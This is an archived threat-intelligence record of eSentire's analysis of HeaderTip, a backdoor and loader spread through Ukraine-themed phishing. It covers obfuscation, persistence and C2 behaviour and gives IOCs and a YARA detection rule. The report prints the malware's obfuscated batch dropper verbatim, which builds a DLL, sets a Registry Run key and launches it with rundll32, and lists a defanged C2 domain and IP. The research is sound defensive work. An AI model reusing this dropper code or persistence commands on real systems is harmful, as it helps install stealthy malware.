{
    "id": "48827286-b400-4025-acff-02571e21fdcd",
    "created_at": "2023-01-12T15:09:25.510492Z",
    "updated_at": "2025-03-27T02:13:34.347538Z",
    "deleted_at": null,
    "sha1_hash": "65bce62f501bfbceb847149a78008a7048b624ad",
    "title": "2022-04-05 - eSentire Threat Intelligence Malware Analysis- HeaderTip",
    "authors": "",
    "file_creation_date": "2022-05-29T00:53:34Z",
    "file_modification_date": "2022-05-29T00:53:34Z",
    "file_size": 1751131,
    "plain_text": "# eSentire Threat Intelligence Malware Analysis: HeaderTip\n\n**[esentire.com/blog/esentire-threat-intelligence-malware-analysis-headertip](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-headertip)**\n\nSince humans are still the weakest link in cybersecurity, threat actor(s) continue to prey on fallible\nhuman nature to launch cyberattacks. As the Russia-Ukraine conflict continues to impact the\nglobal economy and draw worldwide attention, these tensions create opportunities for threat\nactor(s) to designing campaigns to exploit human vulnerabilities and anxieties stemming from the\nRussia-Ukraine conflict.\n\nHeaderTip is a malware used by threat actor(s) that are leveraging the current Russia-Ukraine\nconflict to spread persistent malware. eSentire Threat Intelligence assesses with high confidence\nthat HeaderTip serves as a backdoor and a loader for threat actor(s) to further deploy rootkits,\ntrojans, or other types of malware.\n\neSentire’s Threat Intelligence team has performed a technical malware analysis on HeaderTip.\nThis technical analysis provides a breakdown of how HeaderTip achieves the persistence on the\ninfected machine and how it obfuscates the code to evade detections.\n\n## Key Takeaways\n\neSentire Threat Intelligence assesses with high confidence that the initial access vector for\nHeaderTip was a phishing attack.\nThe threat actor(s) is using obfuscation techniques in the malware sample to hinder the\nanalysis and avoid detection.\n\n\n-----\n\nThe malware achieves the persistence via Registry Run Keys that link to the dropped files in\n%TEMP% folder.\nHeaderTip utilizes ChangeIP for Dynamic DNS (DDNS), which allows the attacker(s) to\nevade detections.\neSentire’s Threat Response Unit (TRU) created two new detections to identify the\nHeaderTip malware.\n\n## Case Study\n\nOn March 22, 2022, the Computer Emergency Response Team of Ukraine (CERT-UA) detected\nthe RAR-archive translated as, “The preservation of video materials on criminal actions from\nRussian military” from a Ukrainian organization. The malware campaign is dubbed as HeaderTip\nand is being tracked as UAC-0026.\n\nCERT-UA reported that they observed similar activity in September 2020. In addition, researchers\n[at SentinelOne have tied the malware campaign to the suspected Chinese group of threat actors](https://www.sentinelone.com/labs/chinese-threat-actor-scarab-targeting-ukraine/)\nknown as [Scarab. The Scarab malware was first observed in 2012 targeting organizations in](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=8bfa7311-fdd9-4f8d-b813-1ab6c9d2c363&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\nRussia, Ukraine, United States, Chile, and Syria.\n\n## Technical Analysis on HeaderTip\n\nThe RAR archive contains an executable with the same naming convention as the archive. The\nexecutable has an embedded PDF file and is not signed. The 32-bit executable is written in C++\nprogramming language with a file size of 653 KB.\n\nAn overview of the malicious files, domains and IPs related to HeaderTip (Exhibit 1).\n\n_Exhibit 1: Overview of HeaderTip malicious files from VirusTotal graph_\n\n\n-----\n\nThe executable file contains the .RCData section with an embedded PDF file which is likely used\nas a bait. The PDF document contains information from the National Police of Ukraine with\ninstructions on how to retain video evidence on criminal activities conducted by the Russian\nmilitary in Ukraine so they can be used in investigations by the Criminal Investigative Division of\nUkraine (Exhibits 2-3).\n\nThe metadata indicates that the PDF document was created on March 16, 2022, which is the\nexact date when the document was issued and signed. We assess with high confidence that the\ndocument was not forged. The document was written by a native Ukrainian speaker, based on\ngrammatical accuracy and vocabulary.\n\n_Exhibit 2: The resource containing a PDF header and objects_\n\n\n-----\n\n_Exhibit 3: The contents_\n\n_of the decoy PDF document_\n\nThe second resource contains the dropped .BAT file named “officecleaner.dat” with the following\ncommands:\n\n\n-----\n\n```\n@echo off\nset objfile=%temp%\\httpshelper.dll\nif not exist %objfile% (\n  echo | set /p=\"M%fgopvhrsdfertj%Z\" > %objfile%\n  type %temp%\\officecleaner.dat >> %objfile%\n  del %temp%\\officecleaner.dat\n  re%ooperoitlksdfgljjdfgijtrjg%g add\nHK%iwejhjkhkl%CU\\Software\\Microsoft\\Windows\\C%ljljlkwjefiofljksdfha%urrentVersion\\Run /v\n\"httpshelper\" /d \"c:\\windows\\system32\\run%jlkjfaewiuoqrjljretfdsg%dll32.exe\n%objfile%,OAService\" /f\n  start c:\\windows\\system32\\rundll32.exe %objfile%,OAService\n) else (\nset bat=\"bat\"\n)\n\n```\nThe command is responsible for dropping a malicious .DLL (Dynamic Link Library) file\n_(officecleaner.dat) onto the %TEMP% folder, appends the MZ (the executable file format used for_\n.EXE files in DOS header) to it and renames the officecleaner.dat file as httpshelper.dll.\nAdditionally, the batch file sets up a persistence mechanism via Registry Run Keys. The\nofficecleaner.dat file is removed from %TEMP% folder after successfully renaming itself (Exhibit\n4).\n\nThe de-obfuscated command is used to add the Registry Run Key with the key name\n_“OAService” to run the malicious httpshelper.dll file:_\n\n_reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"httpshelper\" /d_\n_\"c:\\windows\\system32\\rundll32.exe httpshelper.dll,OAService\" /f start_\n_c:\\windows\\system32\\rundll32.exe httpshelper.dll,OAService_\n\n_Exhibit 4: The contents of the .BAT file_\n\nThe third resource contains a .DLL file with a missing executable (MZ) header (Exhibit 5).\n\n\n-----\n\n_Exhibit 5: Resource containing the .DLL file_\n\nUpon analyzing the executable file in a disassembler, we found another value being added to the\nRegistry Run Keys (Exhibit 6):\n\n_/c reg add_\n_HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v_\n_httpsrvlog /t REG_SZ /d_\n\nThe added httpsrvlog key is responsible for running the officecleaner.bat file under the %TEMP%\ndirectory.\n\n_Exhibit 6: Registry Run Key added for httpsrvlog value_\n\nWe have observed the following files being dropped onto the %TEMP% folder after the running\nthe malicious executable:\n\n**officecleaner.bat: the batch file responsible for persistence of the .DLL file.**\n\n\n-----\n\n**officecleaner.dat: the malicious .DLL file (before the PC reboot or execution of a batch file).**\n**httpshelper.dll: the malicious .DLL file (after the PC reboot or execution of a batch file)**\n**#2163_02_33-2022.pdf: the decoy PDF file.**\n\n### Analyzing the httpshelper.dll file\n\nThe 32-bit .DLL file is written in C++ programming language. The size of the file is relatively small\n– 9.50 KB. Upon analyzing the file in a disassembler, we have noticed that the malware is hiding\nthe API imports by applying the stackstrings and dynamically resolving APIs at runtime (Exhibit\n7).\n\n_Exhibit 7: Using stackstrings for obfuscation_\n\nThe malware hashes the libraries and API functions by applying ROR-13 calculation to evade\ndetections. LoadLibraryA is used to load the Wininet library, which contains the functions that\nenables the application to interact with HTTP protocol in our malware sample. GetProcAddress\nAPI is used to resolve the function’s address. (Exhibit 8-9).\n\n_Exhibit 8: Resolved APIs and kernel32 DLL_\n\n\n-----\n\n_Exhibit 9: Using GetProcAddress to resolve the functions_\n\nThe malicious DLL initiates the connection to the C2 domain over port 8080, the function resides\nin export named OAService (Exhibit 10). The threat actor(s) is utilizing Dynamic DNS (DDNS)\nfrom ChangeIP with the hardcoded domain in the DLL sample, which means that the infected\nmachines can connect to C2 servers using a domain name instead of IP address. This gives the\nthreat actor(s) a huge benefit as they can change or not have to rely on IP addresses to avoid\ndetection.\n\n_Exhibit 10: C2 connection over port 8080_\n\nThe main C2 communication function is shown in Exhibit 11. The malware creates a POST\nrequest handle, checks if the request is successfully received from the C2 server with HTTP\nresponse code 200, and reads 128 bytes of data received from C2 server by calling\nInternetReadFile API (Exhibit 12). It also uses the User-Agent string, Mozilla/5.0 (Windows NT\n_10.0; WOW64; Trident/7.0; rv:11.0) like Gecko, for C2 communications._\n\n\n-----\n\n_Exhibit 11: Main C2 function_\n\nWe have also noticed a function containing a “Loader” string. We believe the function is\nresponsible for loading the DLL into the memory by using VirtualAlloc API to allocate new memory\nregions inside the address space of a process (Exhibit 12). First, it compares if the file contains\nMZ header, then it loops through the first 4096 bytes of the DLL file (Exhibit 13).\n\n_Exhibit 12: Function checks for the MZ header and calls VirtualAlloc_\n\n\n-----\n\n_Exhibit 13: The function loops through the first 4096 bytes of the DLL file_\n\n## What eSentire is doing about it\n\nOur Threat Response Unit (TRU) combines threat intelligence obtained from research, security\nincidents, and the external threat landscape to produce actionable outcomes for our customers.\nWe are taking a holistic response approach to combat all malware by deploying\ncountermeasures, such as:\n\nImplementing two new detections to identify HeaderTip malware across eSentire MDR\n(Managed Detection and Response) for Endpoint solutions.\nPerforming global threat hunts against the IOCs (Indicators of Compromise) and known\nsuspicious activities associated with the HeaderTip malware.\nActively monitoring for any signs of compromise.\n\nOur detection content is supported by investigation runbooks, ensuring our SOC cyber analysts\nrespond rapidly to any intrusion attempts. In addition, our Threat Response Unit closely monitors\nthe threat landscape and addresses capability gaps and performs retroactive threat hunts to\nassess customer impact.\n\n## Recommendations from eSentire’s Threat Response Unit (TRU)\n\nWe recommend implementing the following controls to help secure your organization against\nHeaderTip malware:\n\nConduct security awareness training to lower the risk of phishing threats.\nPatch any external-facing devices and applications on an ongoing basis. Conduct regular\nvulnerability scans to ensure your team is staying on top of identifying, and patching, all\nknown vulnerabilities.\n\n\n-----\n\nEnsure your team is enforcing strong password policies for all employees as part of\nstrengthening your organization’s overall cyber hygiene.\nImplement the Principle of Least Privilege (POLP) that requires giving each user only the\npermissions needed to complete their task and nothing more\n\nWhile the Tactics, Techniques, and Procedures (TTPs) used by threat actor(s) grow in\nsophistication, they lead to a limited set of options at which critical business decisions must be\nmade. Intercepting the various attack paths utilized by the modern threat actor requires actively\nmonitoring the threat landscape, developing, and deploying endpoint detection, and the ability to\ninvestigate logs & network data during active intrusions.\n\neSentire’s Threat Response Unit (TRU) is a world-class team of threat researchers who develop\nnew detections enriched by original threat intelligence and leverage new machine learning\nmodels that correlate multi-signal data and automate rapid response to advanced threats.\n\nIf you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the\nadvantage and put your business ahead of disruption.\n\nLearn what it means to have an elite team of Threat Hunters and Researchers that works for you.\n[Connect with an eSentire Security Specialist.](https://www.esentire.com/get-started)\n\n## Appendix\n\n### Sources\n\n Indicators of Compromise\n\n|Name|Indicators|\n|---|---|\n|Про збереження відеоматеріалів з фіксацією злочинних дій армії російської федерації.rar|839e968aa5a6691929b4d65a539c2261f4ecd1c504a8ba52abbfbac0774d6fa3 (SHA-256)|\n|Про збереження відеоматеріалів з фіксацією злочинних дій армії російської федерації.exe|042271aadf2191749876fc99997d0e6bdd3b89159e7ab8cd11a9f13ae65fa6b1 (SHA-256)|\n|#2163_02_33- 2022.pdf (decoy PDF)|C0962437a293b1e1c2702b98d935e929456ab841193da8b257bd4ab891bf9f69 (SHA-256)|\n\n\n-----\n\n|officecleaner.dat|a2ffd62a500abbd157e46f4caeb91217738297709362ca2c23b0c2d117c7df38|\n|---|---|\n|officecleaner.bat|830c6ead1d972f0f41362f89a50f41d869e8c22ea95804003d2811c3a09c3160|\n|httpshelper.dll|63a218d3fc7c2f7fcadc0f6f907f326cc86eb3f8cf122704597454c34c141cf1|\n|C2 Domain|product2020[.]mrbasic[.]com|\n|IP|104.155.198[.]25|\n\n\n### Yara Rules\n\nThe Yara rule for the malicious DLL and the executable:\n```\nimport \"pe\"\nimport \"math\"\nrule HeaderTip {\n  meta:\n    author = \"eSentire TI\"\n    date = \"03/27/2022\"\n    version = \"1.0\"\n  strings:\n    $string = \"%016I64x%08x\" wide fullword nocase \n    $user_agent = \"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\nGecko\" wide fullword nocase\n    $export = \"OAService\" \n    $dll_name = \"httpshelper.dll\" \n    $c2_domain = \"product2020.mrbasic.com\" wide fullword nocase\n  condition:\n    for any i in (0..pe.number_of_sections - 1): (\n      math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) >=6\nand\n      pe.sections[i].name == \".text\") and\n    all of them and\n    (uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f)    \n}\n\n### Skip To:\n\n```\nKey Takeaways\nCase Study\nTechnical Analysis on HeaderTip\nWhat eSentire is doing about it\nRecommendations from eSentire’s Threat Response Unit (TRU)\nAppendix\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-05 - eSentire Threat Intelligence Malware Analysis- HeaderTip.pdf"
    ],
    "report_names": [
        "2022-04-05 - eSentire Threat Intelligence Malware Analysis- HeaderTip.pdf"
    ],
    "threat_actors": [
        {
            "id": "e7d03ac8-7d6f-4ea0-83a9-10dff2ea1486",
            "created_at": "2022-10-25T16:07:24.158325Z",
            "updated_at": "2025-03-27T02:02:10.127249Z",
            "deleted_at": null,
            "main_name": "Scarab",
            "aliases": [
                "UAC-0026"
            ],
            "source_name": "ETDA:Scarab",
            "tools": [
                "Scieron"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9099912b-a00a-4afb-8294-c6d35af421a1",
            "created_at": "2023-01-06T13:46:39.338108Z",
            "updated_at": "2025-03-27T02:00:03.054726Z",
            "deleted_at": null,
            "main_name": "Scarab",
            "aliases": [],
            "source_name": "MISPGALAXY:Scarab",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536165,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1653785614,
    "ts_modification_date": 1653785614,
    "files": {
        "pdf": "https://archive.orkl.eu/65bce62f501bfbceb847149a78008a7048b624ad.pdf",
        "text": "https://archive.orkl.eu/65bce62f501bfbceb847149a78008a7048b624ad.txt",
        "img": "https://archive.orkl.eu/65bce62f501bfbceb847149a78008a7048b624ad.jpg"
    }
}